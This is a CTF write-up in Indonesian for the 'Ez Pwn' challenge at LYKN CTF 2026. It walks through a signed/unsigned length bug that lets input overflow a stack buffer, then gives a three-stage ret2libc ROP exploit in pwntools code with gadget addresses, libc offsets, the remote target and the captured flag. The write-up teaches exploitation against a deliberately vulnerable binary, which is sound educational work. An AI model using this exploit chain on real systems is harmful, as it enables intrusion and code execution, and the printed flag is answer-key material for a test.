# Ez Pwn — LYKN CTF 2026

**Category:** Pwn  
**Difficulty:** Easy  
**Target:** `15.235.202.47:8999`  
**Flag:** `LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}`

## Deskripsi

> definitely the oldest trick in the book

Program meminta panjang input, menolak nilai di atas 80, lalu membaca data ke buffer stack. Validasi panjang terlihat aman, tetapi tipe integer yang dipakai saat pengecekan berbeda dengan tipe yang akhirnya diberikan ke `read()`.

## Recon

```bash
file chall
checksec --file=chall
```

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Implikasinya:

- alamat gadget dan section binary bersifat tetap karena PIE mati;
- shellcode langsung tidak cocok karena NX aktif;
- tidak ada stack canary, jadi saved RIP bisa ditimpa langsung;
- ROP dan ret2libc menjadi jalur paling sederhana.

## Analisis Bug

Bagian penting di `main` kurang lebih setara dengan kode berikut:

```c
int length;
char size8;
char buffer[160];

scanf("%d", &length);

if (length > 80) {
    puts("So u want to overflow this challenge??");
    return 1;
}

size8 = length;
read(0, buffer, (unsigned char)size8);
```

Disassembly menunjukkan pengecekan signed integer:

```asm
mov eax, DWORD PTR [rbp-0x34]
cmp eax, 0x50
jle 0x401286
```

Setelah lolos, hanya byte terendah yang disimpan:

```asm
mov eax, DWORD PTR [rbp-0x34]
mov BYTE PTR [rbp-0x5], al
movzx edx, BYTE PTR [rbp-0x5]
lea rax, [rbp-0xa0]
mov rsi, rax
mov edi, 0
call read@plt
```

Nilai `-1` memenuhi kondisi `-1 <= 80`. Ketika dipotong menjadi satu byte, nilainya berubah menjadi `0xff` atau 255.

```text
input integer : -1
signed check  : -1 <= 80
uint8_t value : 255
read size     : 255 bytes
```

Buffer berada di `[rbp-0xa0]` dan saved RIP berada di `[rbp+8]`, sehingga offset ke return address adalah:

```text
0xa0 + 8 = 0xa8 = 168 bytes
```

## Gadget

Binary menyediakan gadget sederhana yang cukup untuk mengontrol argumen fungsi System V AMD64:

```text
0x40117a : pop rdi ; ret
0x40117c : pop rsi ; ret
0x40117e : pop rdx ; ret
0x40101a : ret
```

Karena binary tidak memakai PIE, semua alamat tersebut tetap pada remote.

## Strategi Exploit

Exploit akhir memakai tiga kali eksekusi `main`:

1. leak alamat `puts` dari GOT;
2. tulis command ke `.bss` memakai `read`;
3. panggil `system(command)`.

### Stage 1 — Leak libc

ROP pertama memanggil:

```c
puts(puts@got);
main();
```

Payload intinya:

```python
payload = flat(
    {
        168: [
            pop_rdi,
            elf.got["puts"],
            elf.plt["puts"],
            elf.sym["main"],
        ]
    }
)
```

Contoh leak remote:

```text
puts = 0x7a7812050e50
```

Offset libc diperoleh dari sesi DynELF yang berhasil sebelumnya, kemudian dipakai pada solver final agar tidak perlu melakukan lebih dari seratus leak setiap koneksi:

```python
PUTS_OFFSET   = 0x80e50
SYSTEM_OFFSET = 0x50d70

libc_base  = puts_addr - PUTS_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
```

Hasilnya:

```text
libc base = 0x7a7811fd0000
system    = 0x7a7812020d70
```

Base libc harus page-aligned. Pemeriksaan `libc_base & 0xfff == 0` dipakai untuk menolak leak yang rusak.

### Stage 2 — Tulis command ke `.bss`

Section `.bss` dapat ditulis dan alamatnya tetap. Solver memakai `0x404700` sebagai tempat command:

```python
COMMAND_ADDR = 0x404700
COMMAND = (
    b"echo __EZPWN_BEGIN__; "
    b"cat flag* /flag /app/flag* 2>/dev/null; "
    b"echo __EZPWN_END__\x00"
)
```

ROP kedua menjalankan:

```c
read(0, COMMAND_ADDR, len(COMMAND));
main();
```

```python
payload = flat(
    {
        168: [
            pop_rdx,
            len(COMMAND),
            pop_rsi,
            COMMAND_ADDR,
            pop_rdi,
            0,
            elf.plt["read"],
            elf.sym["main"],
        ]
    }
)
```

### Sinkronisasi TCP

Mengirim command langsung setelah payload overflow tidak stabil. `read(0, buffer, 255)` boleh mengembalikan jumlah byte yang lebih pendek dari 255. Jika payload dan command terkirim terlalu berdekatan, sebagian command dapat ikut termakan oleh vulnerable `read()`.

Program mencetak fake flag setelah vulnerable `read()` selesai dan sebelum fungsi kembali ke ROP chain:

```text
Here a fake flag for your effort: ...
```

Baris itu dipakai sebagai synchronization barrier:

```python
send_overflow(io, write_payload)
io.recvuntil(b"Here a fake flag for your effort: ")
io.recvuntil(b"\n")
io.send(COMMAND)
```

Saat fake flag sudah diterima, proses telah melewati vulnerable `read()` dan sedang menunggu pada `read()` milik ROP stage kedua.

Fake flag yang tertanam di binary bukan flag challenge. Overflow merusak variabel sentinel di stack sehingga program masuk ke branch yang mencetak string tersebut.

### Stage 3 — Jalankan `system`

ROP terakhir menjalankan command yang sudah disimpan di `.bss`:

```python
payload = flat(
    {
        168: [
            ret,
            pop_rdi,
            COMMAND_ADDR,
            system_addr,
            elf.sym["main"],
        ]
    }
)
```

Gadget `ret` tambahan menjaga alignment stack sebelum masuk ke libc.

## Kenapa Tidak Memakai DynELF di Solver Final?

`puts(address)` dapat dijadikan arbitrary leak dan memang cukup untuk menjalankan `DynELF`. Percobaan awal berhasil menemukan `system()` setelah sekitar 101 leak, tetapi koneksi remote kadang terputus saat DynELF sedang membaca tabel ELF libc.

Setelah offset `puts` dan `system` diketahui dari libc remote, satu leak GOT sudah cukup. Metode ini lebih cepat dan jauh lebih stabil:

```text
DynELF       : sekitar 100+ leak per attempt
one-leak     : 1 leak puts@GOT
```

## Menjalankan Solver

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py 15.235.202.47 8999 --binary './chall'
```

Output remote:

```text
[*] attempt 1/8
[+] Opening connection to 15.235.202.47 on port 8999: Done
[+] puts        = 0x7a7812050e50
[+] libc base   = 0x7a7811fd0000
[+] system      = 0x7a7812020d70
__EZPWN_BEGIN__
LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}__EZPWN_END__
<FLAG>LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}</FLAG>
```

## Flag

```text
LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}
```
